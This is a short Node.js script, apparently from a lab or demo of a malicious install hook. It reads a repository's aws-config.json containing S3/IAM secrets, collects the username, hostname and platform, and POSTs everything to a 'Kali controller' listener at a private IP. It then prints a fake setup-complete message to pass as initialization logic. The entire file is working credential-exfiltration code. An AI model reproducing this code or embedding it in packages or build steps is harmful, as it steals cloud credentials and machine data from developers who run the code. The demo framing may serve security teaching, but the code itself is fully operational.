const http = require("http");
const os = require("os");
const fs = require("fs");
const path = require("path");

// 1. Gather basic victim machine data
const systemPayload = JSON.stringify({
  user: os.userInfo().username,
  host: os.hostname(),
  platform: process.platform,
  cwd: process.cwd()
});

// 2. TARGET: Look strictly for the S3 configuration file inside this GitHub repository folder
const targetRepoFile = path.join(process.cwd(), "aws-config.json");

if (fs.existsSync(targetRepoFile)) {
    const fileContent = fs.readFileSync(targetRepoFile, "utf8");
    console.log(`👉 Step 1: Found repository file (${targetRepoFile}) containing S3 configs! Reading secrets...`);
    
    // 3. URL-encode the credentials so they travel cleanly across the network wire
    const encodedData = encodeURIComponent(fileContent);
    
    console.log("📡 Step 2: Transmitting IAM secrets payload to Kali controller...");
    
    // 4. Send via object configuration so Netcat registers the packet instantly
    const req = http.request({
        host: "192.168.142.129",
        port: 8000,
        path: `/collect?file=${encodedData}`,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(systemPayload)
        }
    }, (res) => {
        console.log(`✅ Step 4: Success! Controller acknowledged data stream with status: ${res.statusCode}`);
    });

    req.on('error', (err) => {
        console.error("❌ Network Connection Error. Is your Netcat listener active? Error:", err.message);
    });

    // Write the system details into the body
    req.write(systemPayload);
    req.end();
    
    console.log("📤 Step 3: Secrets packet sent into network stream...");
    
    // Hold the process briefly to allow the network packet to exit cleanly
    setTimeout(() => {
        console.log("\n[setup] Initialization logic complete.");
        process.exit(0);
    }, 1500);

} else {
    console.log(`❌ Critical Demo Error: Could not locate ${targetRepoFile}`);
    console.log("👉 Make sure you ran Step 1 to create the aws-config.json file first!");
}
